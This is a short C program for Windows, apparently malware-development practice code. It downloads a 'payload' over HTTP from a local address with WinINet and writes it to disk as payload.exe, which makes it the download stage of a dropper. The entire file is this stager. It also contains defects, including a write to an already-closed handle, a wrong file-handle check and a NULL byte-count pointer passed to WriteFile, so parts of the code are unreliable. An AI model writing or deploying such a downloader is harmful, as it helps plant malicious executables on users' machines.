#include <stdio.h>
#include <Windows.h>
#include <wininet.h>

int main() {
    HINTERNET hInet,
              hResource;
    char*     tempBuf;
    HLOCAL    fullBuf;
    HANDLE    hFile;
    DWORD     bytesRead,
              totalRead;

    hInet = InternetOpenW(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

    if (!hInet) {
        printf("Error opening Internet handle");
        return -1;
    }

    hResource = InternetOpenUrlW(
                    hInet, 
                    L"http://127.0.0.1/success", 
                    NULL, 
                    0, 
                    INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
                    0
                );

    if (!hResource) {
        printf("Error opening Internet file");
        return -1;
    }

    fullBuf = LocalAlloc(LPTR, 1024);
    tempBuf = (char*)HeapAlloc(GetProcessHeap(), 0, 1024);
    bytesRead = 0;
    totalRead = 0;
    do {
        if (!InternetReadFile(hResource, tempBuf, 1024, &bytesRead)) {
            printf("Error reading Internet file");
            return -1;
        }
        totalRead += bytesRead;

        if (totalRead > 1024) {
            fullBuf = LocalReAlloc(fullBuf, totalRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }
        memcpy_s((void*)(fullBuf+totalRead-bytesRead), totalRead, tempBuf, bytesRead);
        memset(tempBuf, 0, bytesRead);
    } while (bytesRead == 1024);

    InternetCloseHandle(hInet);

    InternetSetOptionW(hInet, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    printf("Payload recved: %lu bytes", totalRead);

    hFile = CreateFileW(L"payload.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (!hFile) {
        printf("Error opening file for write");
        return -1;
    }

    if (!WriteFile(hFile, fullBuf, totalRead, NULL, NULL)) {
        printf("Error writing file: %lu", GetLastError());
        return -1;
    }

    CloseHandle(hFile);

    return 0;
}